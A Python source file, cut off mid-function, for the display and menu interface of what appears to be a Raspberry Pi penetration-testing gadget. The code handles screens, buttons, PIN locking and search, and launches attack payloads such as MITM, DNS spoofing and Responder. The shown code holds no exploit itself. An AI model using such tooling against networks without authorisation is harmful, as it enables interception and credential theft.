#!/usr/bin/env python3

import argparse
import base64
import hashlib
import hmac
import os
import secrets
import subprocess
import sys

# Ensure repo root is first on sys.path before hardware/shim imports
_RJ_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
if _RJ_SCRIPT_DIR not in sys.path:
    sys.path.insert(0, _RJ_SCRIPT_DIR)


def _apply_cli_env_overrides():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("--hdmi", action="store_true")
    parser.add_argument("--fullscreen", action="store_true")
    parser.add_argument("--windowed", action="store_true")
    parser.add_argument("--resolution", type=str, default="")
    parser.add_argument("--backend", type=str, default="")
    parser.add_argument("--scale", type=str, default="")
    parser.add_argument("--hud", dest="hud", action="store_true", default=None)
    parser.add_argument("--no-hud", dest="hud", action="store_false")
    parser.add_argument("--no-root", action="store_true")
    args, _ = parser.parse_known_args()
    if args.hdmi:
        os.environ["RJ_DISPLAY_TYPE"] = "HDMI"
    if args.fullscreen:
        os.environ["RJ_HDMI_FULLSCREEN"] = "1"
    elif args.windowed:
        os.environ["RJ_HDMI_FULLSCREEN"] = "0"
    if args.resolution:
        os.environ["RJ_HDMI_RES"] = args.resolution
    if args.backend:
        os.environ["RJ_HDMI_BACKEND"] = args.backend
    if args.scale:
        os.environ["RJ_HDMI_SCALE"] = args.scale
    if args.hud is not None:
        os.environ["RJ_HDMI_HUD"] = "1" if args.hud else "0"
    if args.no_root:
        os.environ["RJ_ALLOW_NONROOT"] = "1"


_apply_cli_env_overrides()

import rj_env

try:
    import netifaces
except ImportError:
    # Minimal stdlib fallback when python3-netifaces is not installed
    class _NetifacesFallback:
        AF_INET = 2

        @staticmethod
        def interfaces():
            try:
                return sorted(os.listdir("/sys/class/net"))
            except Exception:
                return []

        @staticmethod
        def ifaddresses(iface):
            out = {}
            try:
                res = subprocess.run(
                    ["ip", "-4", "-o", "addr", "show", "dev", iface],
                    capture_output=True, text=True, timeout=3,
                )
                addrs = []
                for line in res.stdout.splitlines():
                    parts = line.split()
                    if "inet" in parts:
                        cidr = parts[parts.index("inet") + 1]
                        net = ipaddress.IPv4Interface(cidr)
                        addrs.append({"addr": str(net.ip), "netmask": str(net.netmask)})
                if addrs:
                    out[2] = addrs
            except Exception:
                pass
            return out

        @staticmethod
        def gateways():
            gws = {"default": {}, 2: []}
            try:
                res = subprocess.run(["ip", "-4", "route", "show", "default"], capture_output=True, text=True, timeout=3)
                for line in res.stdout.splitlines():
                    parts = line.split()
                    if "via" in parts and "dev" in parts:
                        gw = parts[parts.index("via") + 1]
                        dev = parts[parts.index("dev") + 1]
                        if 2 not in gws["default"]:
                            gws["default"][2] = (gw, dev)
                        gws[2].append((gw, dev, True))
            except Exception:
                pass
            return gws

    netifaces = _NetifacesFallback()

from datetime import datetime
import threading, time, struct, json
from subprocess import STDOUT, check_output
from PIL import Image, ImageDraw, ImageFont, ImageColor, ImageSequence, ImageOps
import LCD_Config
import LCD_1in44
try:
    import RPi.GPIO as GPIO
except Exception:
    import gpio_shim as GPIO
import socket
import ipaddress
import signal
from functools import partial
import rj_input  # Virtual input bridge (WebSocket + HDMI keyboard → Unix socket)
import rj_keyboard
import rj_theme
import rj_terminal

# WiFi Integration - Add dual interface support
try:
    _wifi_dir = os.path.join(rj_env.get_base_dir(), "wifi")
    if _wifi_dir not in sys.path:
        sys.path.append(_wifi_dir)
    from wifi.raspyjack_integration import (
        get_best_interface,
        get_interface_ip,
        get_interface_network,
        get_nmap_target_network,
        get_mitm_interface,
        get_responder_interface,
        get_dns_spoof_ip,
        show_interface_info,
        set_raspyjack_interface
    )
    WIFI_AVAILABLE = True
    print("✅ WiFi integration loaded - dual interface support enabled")
except ImportError as e:
    print(f"⚠️  WiFi integration not available: {e}")
    print("   Using ethernet-only mode")
    WIFI_AVAILABLE = False

    # Fallback functions for ethernet-only mode
    def get_best_interface():
        return "eth0"
    def get_interface_ip(interface):
        try:
            return subprocess.check_output(f"ip addr show dev {interface} | awk '/inet / {{ print $2 }}'", shell=True).decode().strip().split('/')[0]
        except:
            return None
    def get_nmap_target_network(interface=None):
        try:
            iface = interface or "eth0"
            return subprocess.check_output(f"ip -4 addr show {iface} | awk '/inet / {{ print $2 }}'", shell=True).decode().strip()
        except:
            return None
    def get_mitm_interface():
        return "eth0"
    def get_responder_interface():
        return "eth0"
    def get_dns_spoof_ip(interface=None):
        try:
            iface = interface or "eth0"
            return subprocess.check_output(f"ip -4 addr show {iface} | awk '/inet / {{split($2, a, \"/\"); print a[1]}}'", shell=True).decode().strip()
        except:
            return None
    def set_raspyjack_interface(interface):
        print(f"⚠️  WiFi integration not available - cannot switch to {interface}")
        return False
_stop_evt = threading.Event()
screen_lock = threading.Event()
# Flicker control
_status_text = ""
_temp_c = 0.0
draw_lock = threading.Lock()
_last_button = None
_last_button_time = 0.0
_debounce_seconds = 0.10
_button_down_since = 0.0
_repeat_delay = 0.25
_repeat_interval = 0.08
_double_click_window = 0.6
LOCK_PIN_PBKDF2_ROUNDS = 40000
LOCK_SCREEN_STATIC_SECONDS = 1.2
LOCK_MODE_PIN = "pin"
LOCK_MODE_SEQUENCE = "sequence"
LOCK_SEQUENCE_LENGTH = 6
LOCK_SEQUENCE_ALLOWED_BUTTONS = (
    "KEY_UP_PIN",
    "KEY_DOWN_PIN",
    "KEY_LEFT_PIN",
    "KEY_RIGHT_PIN",
    "KEY1_PIN",
    "KEY2_PIN",
)
LOCK_SEQUENCE_LABELS = {
    "KEY_UP_PIN": "UP",
    "KEY_DOWN_PIN": "DOWN",
    "KEY_LEFT_PIN": "LEFT",
    "KEY_RIGHT_PIN": "RIGHT",
    "KEY1_PIN": "KEY1",
    "KEY2_PIN": "KEY2",
}
LOCK_SEQUENCE_TOKENS = {
    "KEY_UP_PIN": "U",
    "KEY_DOWN_PIN": "D",
    "KEY_LEFT_PIN": "L",
    "KEY_RIGHT_PIN": "R",
    "KEY1_PIN": "1",
    "KEY2_PIN": "2",
}
LOCK_SEQUENCE_DEBOUNCE = 0.06
LOCK_DEFAULTS = {
    "enabled": False,
    "mode": LOCK_MODE_PIN,
    "pin_hash": "",
    "sequence_hash": "",
    "sequence_length": LOCK_SEQUENCE_LENGTH,
    "auto_lock_seconds": 0,
}
LOCK_TIMEOUT_OPTIONS = [
    (0, "Never"),
    (15, "15 sec"),
    (30, "30 sec"),
    (60, "1 min"),
    (300, "5 min"),
    (600, "10 min"),
]
lock_config = LOCK_DEFAULTS.copy()
lock_runtime = {
    "locked": False,
    "last_activity": time.monotonic(),
    "in_lock_flow": False,
    "suspend_auto_lock": False,
    "showing_screensaver": False,
}
_lock_screensaver_cache = {
    "path": None,
    "mtime": None,
    "frames": [],
    "durations": [],
}

# WebUI frame mirror (used by device_server.py)
FRAME_MIRROR_PATH = os.environ.get("RJ_FRAME_PATH", "/dev/shm/raspyjack_last.jpg")
FRAME_MIRROR_ENABLED = os.environ.get("RJ_FRAME_MIRROR", "1") != "0"
CARDPUTER_FRAME_PATH = os.environ.get("RJ_CARDPUTER_FRAME_PATH", "/dev/shm/raspyjack_cardputer.jpg")
CARDPUTER_FRAME_ENABLED = os.environ.get("RJ_CARDPUTER_FRAME_ENABLED", "1") != "0"
CARDPUTER_FRAME_MODE = str(os.environ.get("RJ_CARDPUTER_FRAME_MODE", "stretch") or "stretch").strip().lower()
CARDPUTER_FRAME_WIDTH = max(1, int(os.environ.get("RJ_CARDPUTER_FRAME_WIDTH", "240")))
CARDPUTER_FRAME_HEIGHT = max(1, int(os.environ.get("RJ_CARDPUTER_FRAME_HEIGHT", "135")))
CARDPUTER_FRAME_QUALITY = min(100, max(1, int(os.environ.get("RJ_CARDPUTER_FRAME_QUALITY", "60"))))
CARDPUTER_FRAME_SUBSAMPLING = min(2, max(0, int(os.environ.get("RJ_CARDPUTER_FRAME_SUBSAMPLING", "0"))))
try:
    _frame_fps = float(os.environ.get("RJ_FRAME_FPS", "10"))
    FRAME_MIRROR_INTERVAL = 1.0 / max(1.0, _frame_fps)
except Exception:
    FRAME_MIRROR_INTERVAL = 0.1
try:
    _cardputer_frame_fps = float(os.environ.get("RJ_CARDPUTER_FRAME_FPS", "6"))
    CARDPUTER_FRAME_INTERVAL = 1.0 / max(1.0, _cardputer_frame_fps)
except Exception:
    CARDPUTER_FRAME_INTERVAL = 1.0 / 6.0

def _set_last_button(name, ts):
    global _last_button, _last_button_time, _button_down_since
    _last_button = name
    _last_button_time = ts
    _button_down_since = ts


def _log_virtual_consume(stage, button):
    try:
        print(f"[virtual_consume] {stage}: {button}", flush=True)
    except Exception:
        pass

# https://www.waveshare.com/wiki/File:1.44inch-LCD-HAT-Code.7z

_wifi_connected = False
_battery_pct = -1
_battery_charging = False
_show_clock = True

def _check_battery():
    global _battery_pct, _battery_charging
    try:
        import glob
        ps = glob.glob("/sys/class/power_supply/bq27*/")
        if not ps:
            _battery_pct = -1
            return
        base = ps[0]
        cap_path = base + "capacity"
        if os.path.exists(cap_path):
            with open(cap_path) as f:
                _battery_pct = max(0, min(100, int(f.read().strip())))
        else:
            with open(base + "voltage_now") as f:
                uv = int(f.read().strip())
            _battery_pct = max(0, min(100, int((uv / 1_000_000 - 3.0) / 1.2 * 100)))
        status_path = base + "status"
        if os.path.exists(status_path):
            with open(status_path) as f:
                _battery_charging = f.read().strip() == "Charging"
    except Exception:
        _battery_pct = -1

def _check_wifi():
    """Check if WiFi is connected (fast sysfs check first, avoiding iwgetid fork when down)."""
    global _wifi_connected
    try:
        any_wlan = False
        for iface in ("wlan0", "wlan1"):
            op = f"/sys/class/net/{iface}/operstate"
            if os.path.exists(op):
                any_wlan = True
                try:
                    with open(op, "r", encoding="utf-8") as fh:
                        if fh.read().strip().lower() == "up":
                            _wifi_connected = True
                            return
                except OSError:
                    pass
        if any_wlan:
            _wifi_connected = False
            return
        r = subprocess.run(["iwgetid", "-r"], capture_output=True, text=True, timeout=2)
        _wifi_connected = bool(r.stdout.strip())
    except Exception:
        _wifi_connected = False


def _scan_proc_status():
    """Pure-Python single-pass /proc scan (zero subprocess forks!)."""
    nmap_on = False
    mitm_on = False
    ettercap_on = False
    responder_on = False
    try:
        for entry in os.listdir("/proc"):
            if not entry.isdigit():
                continue
            try:
                with open(f"/proc/{entry}/comm", "rb") as fh:
                    comm = fh.read(32).strip().decode("utf-8", "ignore")
            except OSError:
                continue
            if comm == "nmap":
                nmap_on = True
            elif comm in ("tcpdump", "arpspoof"):
                mitm_on = True
            elif comm == "ettercap":
                ettercap_on = True
            elif comm.startswith("python") and not responder_on:
                try:
                    with open(f"/proc/{entry}/cmdline", "rb") as fh:
                        if b"Responder.py" in fh.read(256):
                            responder_on = True
                except OSError:
                    pass
    except OSError:
        pass
    return nmap_on, mitm_on, ettercap_on, responder_on

_net_iface_summary = ""
_net_ip_summary = ""


def _refresh_net_summary():
    global _net_iface_summary, _net_ip_summary
    try:
        routed, _gw = _get_routed_info()
        iface = routed or get_best_interface_prefer_eth()
        ip, _mask = _get_interface_ipv4(iface) if iface else (None, None)
        _net_iface_summary = iface or "none"
        _net_ip_summary = ip or "no ip"
    except Exception:
        pass


_last_toolbar_sig = None


def _stats_loop():
    global _status_text, _temp_c, _last_toolbar_sig
    _wifi_tick = 2  # trigger initial check on first pass
    while not _stop_evt.is_set():
        if screen_lock.is_set():
            _stop_evt.wait(0.5)
            continue
        try:
            _temp_c = temp()
            _wifi_tick += 1
            if _wifi_tick % 3 == 0:
                _check_wifi()
                _check_battery()
                _refresh_net_summary()
            nmap_on, mitm_on, ettercap_on, responder_on = _scan_proc_status()
            status = ""
            if nmap_on:
                status = "SCAN"
            elif mitm_on:
                status = "MITM"
            elif ettercap_on:
                status = "DNS"
            if responder_on:
                status = "RESP"
            _status_text = status
            if not lock_runtime.get("showing_screensaver"):
                sig = (
                    time.strftime("%H:%M") if _show_clock else "",
                    int(_temp_c) if _temp_c > 0 else 0,
                    bool(_wifi_connected),
                    int(_battery_pct),
                    bool(_battery_charging),
                    _status_text,
                    bool(rj_terminal.is_shared_session_alive()),
                    _get_breadcrumb(),
                )
                if sig != _last_toolbar_sig:
                    _last_toolbar_sig = sig
                    try:
                        draw_lock.acquire()
                        _draw_toolbar()
                    finally:
                        draw_lock.release()
        except Exception:
            pass
        _stop_evt.wait(5.0)

_display_dirty = True  # flag: image changed, needs refresh
_display_dirty_evt = threading.Event()
_display_dirty_evt.set()


def mark_display_dirty():
    global _display_dirty
    _display_dirty = True
    _display_dirty_evt.set()


def _display_loop():
    global _display_dirty
    while not _stop_evt.is_set():
        _display_dirty_evt.wait(timeout=1.0)
        if _stop_evt.is_set():
            break
        if not screen_lock.is_set() and _display_dirty:
            _display_dirty_evt.clear()
            try:
                draw_lock.acquire()
                # LCD_ShowImage already handles HDMI SHM publish + client-aware WebUI/Cardputer mirror
                LCD.LCD_ShowImage(image, 0, 0)
                _display_dirty = False
            finally:
                draw_lock.release()
        else:
            _display_dirty_evt.clear()
            if screen_lock.is_set():
                _stop_evt.wait(0.25)

def start_background_loops():
    threading.Thread(target=_stats_loop,   daemon=True).start()
    threading.Thread(target=_display_loop, daemon=True).start()

if os.getuid() != 0:
    _allow_nonroot = (
        os.environ.get("RJ_ALLOW_NONROOT", "0") == "1"
        or (getattr(LCD_1in44, "_DISPLAY_TYPE", "") == "HDMI" and rj_env.has_desktop_session())
    )
    if _allow_nonroot:
        print("⚠️  Running in non-root desktop HDMI mode (network/WiFi attack payloads may require sudo -E).")
    else:
        print("You need a sudo to run this! (Or pass --hdmi --no-root for desktop UI mode)")
        exit()
print(" ")
print(" ------ EmberJack Started !!! ------ ")
start_time = time.time()

####### Classes except menu #######
# Screen dimensions (read from LCD driver at import time)
_SCR_W = LCD_1in44.LCD_WIDTH
_SCR_H = LCD_1in44.LCD_HEIGHT
if _SCR_W != _SCR_H:
    _SCALE = min(_SCR_W, _SCR_H) / 128  # widescreen: use constraining dimension
else:
    _SCALE = _SCR_W / 128  # square: 1.0 for 128x128, 1.875 for 240x240

_IS_WIDESCREEN = (_SCR_W >= 300 and _SCR_W >= int(_SCR_H * 1.4))
_IS_COMPACT = (_SCR_W < 200 or _SCR_H < 150)

def S(v):
    """Scale a pixel value from 128-base to current screen resolution."""
    return int(v * _SCALE)

# Responsive chrome dimensions (HD-crisp on 640x360, proportional on 320x170 / 240x240 / 128x128)
if _SCR_W >= 560 and _SCR_H >= 300:
    _TOPBAR_H = 28
    _FOOTER_H = 24
    _UI_PAD = 8
    _ROW_H = 27
    _FONT_PX = 13
    _TITLE_PX = 14
    _SMALL_PX = 11
    _ICON_PX = 13
elif _IS_WIDESCREEN:
    _TOPBAR_H = 19
    _FOOTER_H = 16
    _UI_PAD = 5
    _ROW_H = 18
    _FONT_PX = 10
    _TITLE_PX = 11
    _SMALL_PX = 9
    _ICON_PX = 10
elif _SCR_W >= 400:
    _TOPBAR_H = 28
    _FOOTER_H = 24
    _UI_PAD = 8
    _ROW_H = 30
    _FONT_PX = 14
    _TITLE_PX = 15
    _SMALL_PX = 11
    _ICON_PX = 15
elif _SCR_W >= 200:
    _TOPBAR_H = 20
    _FOOTER_H = 18
    _UI_PAD = 6
    _ROW_H = 23
    _FONT_PX = 12
    _TITLE_PX = 13
    _SMALL_PX = 9
    _ICON_PX = 13
else:
    _TOPBAR_H = 14
    _FOOTER_H = 13
    _UI_PAD = 3
    _ROW_H = 14
    _FONT_PX = 9
    _TITLE_PX = 10
    _SMALL_PX = 8
    _ICON_PX = 10

_CONTENT_Y0 = _TOPBAR_H + (_UI_PAD // 2)
_CONTENT_Y1 = _SCR_H - _FOOTER_H - (_UI_PAD // 2)

### Global mostly static values ###
_BASE_DIR = rj_env.get_base_dir()

class Defaults():
    start_text = [_UI_PAD + 4, _CONTENT_Y0 + 2]
    text_gap = _ROW_H

    updown_center = _SCR_W // 2
    updown_pos = [S(15), S(52), S(88)]


    install_path = os.path.join(_BASE_DIR, "")
    imgstart_path = os.path.join(install_path, "img/")
    config_file = rj_env.get_config_path()
    screensaver_gif = os.path.join(install_path, "img/screensaver/default.gif")

    payload_path = os.path.join(install_path, "payloads/")
    payload_log  = os.path.join(install_path, "loot/payload.log")


### Color scheme class (Obsidian Ember eye-friendly defaults) ###
class template():
    # Color values (Obsidian Ember palette — zero eye strain)
    border = rj_theme.DEFAULT_GUI_COLORS["BORDER"]
    background = rj_theme.DEFAULT_GUI_COLORS["BACKGROUND"]
    text = rj_theme.DEFAULT_GUI_COLORS["TEXT"]
    selected_text = rj_theme.DEFAULT_GUI_COLORS["SELECTED_TEXT"]
    select = rj_theme.DEFAULT_GUI_COLORS["SELECTED_TEXT_BACKGROUND"]
    gamepad = rj_theme.DEFAULT_GUI_COLORS["GAMEPAD"]
    gamepad_fill = rj_theme.DEFAULT_GUI_COLORS["GAMEPAD_FILL"]

    def __init__(self):
        self._rebuild_derived()

    def _rebuild_derived(self):
        """Precompute derived secondary tokens once whenever palette colors change."""
        self.surface = rj_theme.blend_hex(self.background, "#26252B", 0.35)
        self.elevated = rj_theme.blend_hex(self.background, "#34323A", 0.45)
        self.well = rj_theme.blend_hex(self.background, "#151418", 0.4)
        self.border_subtle = rj_theme.blend_hex(self.background, self.border, 0.24)
        self.accent = self.gamepad
        self.text_muted = rj_theme.blend_hex(self.text, self.background, 0.38)
        self.text_dim = rj_theme.blend_hex(self.text, self.background, 0.58)
        self._sig = (
            self.background,
            self.border,
            self.text,
            self.selected_text,
            self.select,
            self.gamepad,
            self.gamepad_fill,
        )

    # Render a sleek, eye-friendly hairline frame instead of a thick neon box
    def DrawBorder(self):
        w, h = _SCR_W, _SCR_H
        draw.rectangle((0, _TOPBAR_H, w - 1, h - 1), outline=self.border_subtle, width=1)
        draw.line([(0, _TOPBAR_H), (w - 1, _TOPBAR_H)], fill=self.border, width=1)

    # Render inside of the border
    def DrawMenuBackground(self, dirty=True):
        draw.rectangle((0, _TOPBAR_H, _SCR_W - 1, _SCR_H - 1), fill=self.background)
        if dirty:
            mark_display_dirty()

    # Apply a named preset from rj_theme.THEME_PRESETS
    def ApplyPreset(self, preset_name):
        preset = rj_theme.THEME_PRESETS.get(preset_name)
        if not preset:
            return False
        self.LoadDictonary(preset, allow_migrate=False)
        return True

    def Set(self, index, color_val):
        if index == 0:
            self.background = color_val
        elif index == 1:
            self.border = color_val
        elif index == 2:
            self.text = color_val
        elif index == 3:
            self.selected_text = color_val
        elif index == 4:
            self.select = color_val
        elif index == 5:
            self.gamepad = color_val
        elif index == 6:
            self.gamepad_fill = color_val
        self._rebuild_derived()
        if index == 1:
            self.DrawBorder()

    def Get(self, index):
        if index == 0:
            return self.background
        elif index == 1:
            return self.border
        elif index == 2:
            return self.text
        elif index == 3:
            return self.selected_text
        elif index == 4:
            return self.select
        elif index == 5:
            return self.gamepad
        elif index == 6:
            return self.gamepad_fill

    # Methods for JSON export
    def Dictonary(self):
        return {
            "BORDER": self.border,
            "BACKGROUND": self.background,
            "TEXT": self.text,
            "SELECTED_TEXT": self.selected_text,
            "SELECTED_TEXT_BACKGROUND": self.select,
            "GAMEPAD": self.gamepad,
            "GAMEPAD_FILL": self.gamepad_fill,
        }

    def LoadDictonary(self, dic, allow_migrate=True):
        if allow_migrate and rj_theme.should_migrate_legacy_colors(dic):
            dic = rj_theme.DEFAULT_GUI_COLORS
        self.background = dic.get("BACKGROUND", rj_theme.DEFAULT_GUI_COLORS["BACKGROUND"])
        self.border = dic.get("BORDER", rj_theme.DEFAULT_GUI_COLORS["BORDER"])
        self.text = dic.get("TEXT", rj_theme.DEFAULT_GUI_COLORS["TEXT"])
        self.selected_text = dic.get("SELECTED_TEXT", rj_theme.DEFAULT_GUI_COLORS["SELECTED_TEXT"])
        self.select = dic.get("SELECTED_TEXT_BACKGROUND", rj_theme.DEFAULT_GUI_COLORS["SELECTED_TEXT_BACKGROUND"])
        self.gamepad = dic.get("GAMEPAD", rj_theme.DEFAULT_GUI_COLORS["GAMEPAD"])
        self.gamepad_fill = dic.get("GAMEPAD_FILL", rj_theme.DEFAULT_GUI_COLORS["GAMEPAD_FILL"])
        self._rebuild_derived()
        self.DrawBorder()


# Menu search filter (CardputerZero keyboard support)
_menu_filter = ""
_menu_filter_active = False
try:
    import evdev_keys as _evdev
    _HAS_EVDEV = True
except ImportError:
    _HAS_EVDEV = False

# Evdev keycode → character mapping for search
_KEY_CHARS = {
    16:'q',17:'w',18:'e',19:'r',20:'t',21:'y',22:'u',23:'i',24:'o',25:'p',
    30:'a',31:'s',32:'d',33:'f',34:'g',35:'h',36:'j',37:'k',38:'l',
    44:'z',45:'x',46:'c',47:'v',48:'b',49:'n',50:'m',
    2:'1',3:'2',4:'3',5:'4',6:'5',7:'6',8:'7',9:'8',10:'9',11:'0',
    57:' ',
}

# Edge-triggered key state tracking (detect press, not hold)
_prev_key_state = {}

def _menu_filter_reset():
    global _menu_filter, _menu_filter_active, _prev_key_state
    _menu_filter = ""
    _menu_filter_active = False
    _prev_key_state = {}
    try:
        rj_keyboard.set_text_mode(False)
    except Exception:
        pass

def _menu_filter_activate():
    global _menu_filter_active, _prev_key_state
    _menu_filter_active = True
    _prev_key_state = {}
    try:
        rj_keyboard.set_text_mode(True)
    except Exception:
        pass
    if _HAS_EVDEV:
        for code in _KEY_CHARS:
            _prev_key_state[code] = _evdev.is_key_pressed(code)

def _menu_filter_add(char):
    global _menu_filter
    _menu_filter += char

def _menu_filter_backspace():
    global _menu_filter, _menu_filter_active
    _menu_filter = _menu_filter[:-1]
    if not _menu_filter:
        _menu_filter_active = False

def _check_search_trigger():
    """Check if S key was just pressed (edge-triggered, CardputerZero only)."""
    if not _HAS_EVDEV:
        return False
    code = 31  # S key
    now_pressed = _evdev.is_key_pressed(code)
    was_pressed = _prev_key_state.get(code, False)
    _prev_key_state[code] = now_pressed
    return now_pressed and not was_pressed

def _check_search_key():
    """Check if a letter key was just pressed (edge-triggered). Returns char or None."""
    global _prev_key_state
    if not _HAS_EVDEV:
        return None
    for code, char in _KEY_CHARS.items():
        now_pressed = _evdev.is_key_pressed(code)
        was_pressed = _prev_key_state.get(code, False)
        _prev_key_state[code] = now_pressed
        if now_pressed and not was_pressed:
            return char
    return None

def _check_search_backspace():
    """Check if backspace (evdev code 14) was just pressed (edge-triggered)."""
    if not _HAS_EVDEV:
        return False
    code = 14
    now_pressed = _evdev.is_key_pressed(code)
    was_pressed = _prev_key_state.get(code, False)
    _prev_key_state[code] = now_pressed
    return now_pressed and not was_pressed

def _check_search_escape():
    """Check if ESC (evdev code 1) was just pressed (edge-triggered)."""
    if not _HAS_EVDEV:
        return False
    code = 1
    now_pressed = _evdev.is_key_pressed(code)
    was_pressed = _prev_key_state.get(code, False)
    _prev_key_state[code] = now_pressed
    return now_pressed and not was_pressed

def _filter_menu_items(inlist, query):
    """Filter menu items by search query. Returns filtered list."""
    if not query:
        return inlist
    q = query.lower()
    return [item for item in inlist if q in item.lower()]

# Flat payload list for global search (built lazily)
_flat_payload_list = None
_flat_payload_map = {}

def _build_flat_payload_list():
    """Build a flat list of all payload labels + exec mappings for global search."""
    global _flat_payload_list, _flat_payload_map
    all_payloads = list_payloads()
    labels = []
    _flat_payload_map.clear()
    for rel_path in all_payloads:
        name = os.path.splitext(os.path.basename(rel_path))[0]
        label = f" {name}"
        labels.append(label)
        _flat_payload_map[label] = rel_path
    _flat_payload_list = labels
    return labels

def _get_flat_payload_list():
    """Get the flat payload list, building it if needed."""
    global _flat_payload_list
    if _flat_payload_list is None:
        return _build_flat_payload_list()
    return _flat_payload_list

def _invalidate_flat_payload_list():
    """Force rebuild on next access (call after adding/removing payloads)."""
    global _flat_payload_list
    _flat_payload_list = None

_FOOTER_STRIP_CACHE: dict = {"key": None, "img": None}


def _draw_footer_bar(hint_text="", right_text=""):
    """Draw a sleek Obsidian Ember footer bar with keyboard hints (cached strip)."""
    y = _SCR_H - _FOOTER_H
    key = (_SCR_W, _FOOTER_H, hint_text, right_text, getattr(color, "_sig", None))
    if _FOOTER_STRIP_CACHE["key"] == key and _FOOTER_STRIP_CACHE["img"] is not None:
        image.paste(_FOOTER_STRIP_CACHE["img"], (0, y))
        return

    strip = Image.new("RGB", (_SCR_W, _FOOTER_H), color.surface)
    sd = ImageDraw.Draw(strip)
    sd.line([(0, 0), (_SCR_W - 1, 0)], fill=color.border_subtle, width=1)
    pad = max(3, _UI_PAD)
    right_w = 0
    if right_text:
        rb = rj_theme.measure_text(small_font, right_text, sd)
        right_w = (rb[2] - rb[0]) + pad * 2
        ry = max(1, (_FOOTER_H - (rb[3] - rb[1])) // 2 - rb[1])
        sd.text((_SCR_W - pad - (rb[2] - rb[0]), ry), right_text, fill=color.selected_text, font=small_font)
    if hint_text:
        max_w = max(24, _SCR_W - pad * 2 - right_w)
        ht = rj_theme.truncate_text(sd, hint_text, max_w, small_font, ellipsis="…")
        hb = rj_theme.measure_text(small_font, ht or "A", sd)
        hy = max(1, (_FOOTER_H - (hb[3] - hb[1])) // 2 - hb[1])
        sd.text((pad, hy), ht, fill=color.text_muted, font=small_font)
    _FOOTER_STRIP_CACHE["key"] = key
    _FOOTER_STRIP_CACHE["img"] = strip
    image.paste(strip, (0, y))


def _draw_search_bar():
    """Draw an Obsidian Ember live search bar at the bottom when search is active."""
    if not _menu_filter_active:
        return
    bar_h = _FOOTER_H
    y = _SCR_H - bar_h
    draw.rectangle((0, y, _SCR_W - 1, _SCR_H - 1), fill=color.select)
    draw.line([(0, y), (_SCR_W - 1, y)], fill=color.accent, width=1)
    pad = max(4, _UI_PAD)
    try:
        _search_icon_font = rj_env.load_font(max(8, _SMALL_PX), icon=True)
        ib = rj_theme.measure_text(_search_icon_font, "\uf002", draw)
        iy = y + max(1, (bar_h - (ib[3] - ib[1])) // 2 - ib[1])
        draw.text((pad, iy), "\uf002", fill=color.selected_text, font=_search_icon_font)
        tx = pad + (ib[2] - ib[0]) + 6
    except Exception:
        draw.text((pad, y + 3), "/", fill=color.selected_text, font=small_font)
        tx = pad + 10
    query_text = _menu_filter if _menu_filter else ""
    cursor = "|" if int(time.time() * 2) % 2 == 0 else " "
    filtered_count = f"{_menu_filter_match_count} hits" if _menu_filter else "Type to filter"
    cb = rj_theme.measure_text(small_font, filtered_count, draw)
    cw = cb[2] - cb[0]
    cy = y + max(1, (bar_h - (cb[3] - cb[1])) // 2 - cb[1])
    draw.text((_SCR_W - pad - cw, cy), filtered_count, fill=color.text_muted, font=small_font)
    max_q = max(20, _SCR_W - tx - cw - pad * 2)
    shown_q = _truncate_to_width(query_text + cursor, max_q, small_font)
    qb = rj_theme.measure_text(small_font, shown_q or "A", draw)
    qy = y + max(1, (bar_h - (qb[3] - qb[1])) // 2 - qb[1])
    draw.text((tx, qy), shown_q, fill=rj_theme.EMBER_THEME["text_bright"], font=small_font)

_menu_filter_match_count = 0

def _apply_search_filter(inlist_original):
    """Apply current search filter and return (filtered_list, total). Updates match count."""
    global _menu_filter_match_count
    if _menu_filter:
        filtered = _filter_menu_items(inlist_original, _menu_filter)
        _menu_filter_match_count = len(filtered)
        return filtered if filtered else inlist_original, len(filtered) if filtered else len(inlist_original)
    _menu_filter_match_count = len(inlist_original)
    return list(inlist_original), len(inlist_original)

def _handle_search_input(inlist_original, use_global=False):
    """Process search keyboard input. Returns (changed, new_inlist, new_total, new_index) or None if no search input.
    If use_global=True, search across ALL payloads (not just the current menu list)."""
    global _menu_filter_active
    if not _HAS_EVDEV:
        return None

    search_source = _get_flat_payload_list() if (use_global and _menu_filter_active) else inlist_original

    if _menu_filter_active:
        if _check_search_escape():
            _menu_filter_reset()
            inlist = list(inlist_original)
            return True, inlist, len(inlist), 0
        if _check_search_backspace():
            _menu_filter_backspace()
            if not _menu_filter:
                inlist = list(inlist_original)
                return True, inlist, len(inlist), 0
            inlist, total = _apply_search_filter(search_source)
            return True, inlist, total, 0
        ch = _check_search_key()
        if ch is not None:
            _menu_filter_add(ch)
            inlist, total = _apply_search_filter(search_source)
            return True, inlist, total, 0
    else:
        if _check_search_trigger():
            _menu_filter_activate()
            return True, None, None, None

    return None

####### Simple methods #######
### Get any button press ###
def getButton():
    global _last_button, _last_button_time, _button_down_since
    last_bg_chk = 0.0
    while 1:
        now_m = time.monotonic()
        if (now_m - last_bg_chk) >= 0.25:
            last_bg_chk = now_m
            if _should_auto_lock():
                lock_device("Auto lock")
                continue
            # WebUI payload requests: launch immediately while waiting for input
            requested = _check_payload_request()
            if requested:
                if screen_lock.is_set():
                    screen_lock.clear()
                exec_payload(requested)
                continue
        # 1) Lossless text/keyboard events from normal keyboard / WebUI
        t_evt = rj_input.get_text_event()
        if t_evt:
            spec = str(t_evt.get("special") or "")
            ch = str(t_evt.get("key") or "")
            if _menu_filter_active:
                if spec == "ESCAPE":
                    _mark_user_activity()
                    return "_KB_ESCAPE"
                if spec in ("BACKSPACE", "DELETE"):
                    # Drain companion KEY3_PIN emitted by STANDARD_NAV_MAP for Backspace
                    # so pressing Backspace never double-fires back across two screens.
                    if spec == "BACKSPACE":
                        _q_v = getattr(rj_input, "_q", None)
                        if _q_v is not None:
                            _kept = []
                            _dropped = False
                            try:
                                while True:
                                    _it = _q_v.get_nowait()
                                    if not _dropped and _it == "KEY3_PIN":
                                        _dropped = True
                                        continue
                                    _kept.append(_it)
                            except Exception:
                                pass
                            for _it in _kept:
                                try:
                                    _q_v.put_nowait(_it)
                                except Exception:
                                    pass
                    _mark_user_activity()
                    return "_KB_BACKSPACE"
                if spec == "ENTER":
                    _mark_user_activity()
                    return "_KB_ENTER"
                if ch:
                    _mark_user_activity()
                    return f"_KB_{ch}"
            else:
                # Outside active search: pass desktop navigation specials (PgUp/PgDn/Home/End/Ctrl+T),
                # Backspace editing, and printable non-space characters for instant menu search & pickers.
                if spec in ("BACKSPACE", "DELETE"):
